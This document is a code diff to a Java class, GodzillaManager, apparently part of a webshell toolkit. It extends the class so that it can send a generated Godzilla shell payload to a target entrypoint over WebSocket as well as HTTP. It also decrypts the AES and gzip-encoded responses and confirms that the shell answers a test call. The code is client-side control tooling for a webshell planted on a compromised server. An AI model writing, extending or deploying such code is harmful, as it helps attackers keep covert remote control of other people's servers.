@@ -17,8 +17,10 @@ import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 import java.io.*;
 import java.net.URLDecoder;
+import java.nio.ByteBuffer;
 import java.nio.charset.StandardCharsets;
-import java.util.*;
+import java.util.HashMap;
+import java.util.Map;
 import java.util.zip.GZIPInputStream;
 import java.util.zip.GZIPOutputStream;
 
@@ -28,25 +30,17 @@ import java.util.zip.GZIPOutputStream;
 @Getter
 @Setter
 public class GodzillaManager implements Closeable {
-    private static final List<String> CLASS_NAMES;
 
-    static {
-        InputStream classNamesStream = Objects.requireNonNull(GodzillaManager.class.getResourceAsStream("/godzillaShellClassNames.txt"));
-        CLASS_NAMES = IOUtils.readLines(classNamesStream, "UTF-8");
-    }
-
-    private final OkHttpClient client;
+    private final OkHttpClient client = new OkHttpClient.Builder().build();
     private String cookie = "";
     private String entrypoint;
     private String key;
     private String pass;
     private String md5;
     private Request request;
+    private boolean http;
+    private boolean ws;
     private Map<String, String> headers = new HashMap<>();
-
-    public GodzillaManager() {
-        this.client = new OkHttpClient.Builder().build();
-    }
 
     public static Pair<String, String> getKeyMd5(String key, String pass) {
         String md5Key = DigestUtils.md5Hex(key).substring(0, 16);
@@ -60,7 +54,6 @@ public class GodzillaManager implements Closeable {
 
     @SneakyThrows
     public static byte[] generateGodzilla() {
-        Random random = new Random();
         try (DynamicType.Unloaded<?> make = new ByteBuddy()
                 .redefine(Payload.class)
                 .visit(TargetJreVersionVisitorWrapper.DEFAULT)
@@ -103,7 +96,7 @@ public class GodzillaManager implements Closeable {
             return responseBody;
         }
         int i = responseBody.indexOf(md5.substring(0, 16));
-        String result = responseBody.substring(i  + 16);
+        String result = responseBody.substring(i + 16);
         int lastIndex = result.indexOf(md5.substring(16));
         result = result.substring(0, lastIndex);
         byte[] bytes = Base64.decodeBase64(result);
@@ -187,37 +180,59 @@ public class GodzillaManager implements Closeable {
 
     public boolean start() {
         byte[] bytes = generateGodzilla();
-        try (Response response = post(bytes)) {
-            String setCookie = response.header("Set-Cookie");
-            if (setCookie != null && setCookie.contains("JSESSIONID=")) {
-                cookie = setCookie.substring(setCookie.indexOf("JSESSIONID="), setCookie.indexOf(";"));
+        if (isHttp()) {
+            try (Response response = post(bytes)) {
+                String setCookie = response.header("Set-Cookie");
+                if (setCookie != null && setCookie.contains("JSESSIONID=")) {
+                    cookie = setCookie.substring(setCookie.indexOf("JSESSIONID="), setCookie.indexOf(";"));
+                }
+                if (response.isSuccessful()) {
+                    return true;
+                }
+                System.out.println(response.body().string().trim());
+            } catch (IOException e) {
+                e.printStackTrace();
             }
-            if (response.isSuccessful()) {
+        }
+        if (isWs()) {
+            try {
+                BlockingJavaWebSocketClient.sendRequestWaitResponse(this.entrypoint, ByteBuffer.wrap(bytes));
                 return true;
+            } catch (Exception e) {
+                e.printStackTrace();
             }
-            System.out.println(response.body().string().trim());
-        } catch (IOException e) {
-            e.printStackTrace();
         }
         return false;
     }
 
+    @SneakyThrows
     public boolean test() {
         byte[] bytes = generateMethodCallBytes("test");
-        try (Response response = post(bytes)) {
-            if (response.isSuccessful()) {
-                ResponseBody body = response.body();
-                if (body != null) {
-                    String resultFromRes = getResultFromRes(body.string(), this.key, this.md5);
-                    System.out.println(resultFromRes);
-                    return "ok".equals(resultFromRes);
+        if (isHttp()) {
+            try (Response response = post(bytes)) {
+                if (response.isSuccessful()) {
+                    ResponseBody body = response.body();
+                    if (body != null) {
+                        String resultFromRes = getResultFromRes(body.string(), this.key, this.md5);
+                        System.out.println(resultFromRes);
+                        return "ok".equals(resultFromRes);
+                    }
                 }
+                return false;
+            } catch (IOException e) {
+                e.printStackTrace();
+                return false;
             }
-            return false;
-        } catch (IOException e) {
-            e.printStackTrace();
-            return false;
         }
+
+        if (isWs()) {
+            byte[] bytes1 = BlockingJavaWebSocketClient.sendRequestWaitResponse(this.entrypoint, ByteBuffer.wrap(bytes));
+            byte[] x = aes(key, bytes1, false);
+            GZIPInputStream gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(x));
+            return "ok".equals(IOUtils.toString(gzipInputStream, StandardCharsets.UTF_8));
+        }
+
+        return false;
     }
 
     @Override
@@ -284,6 +299,12 @@ public class GodzillaManager implements Closeable {
             headers.put("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2");
             headers.putAll(this.headers);
             manager.setHeaders(headers);
+            if (entrypoint.startsWith("http")) {
+                manager.setHttp(true);
+            }
+            if (entrypoint.startsWith("ws")) {
+                manager.setWs(true);
+            }
             return manager;
         }
     }
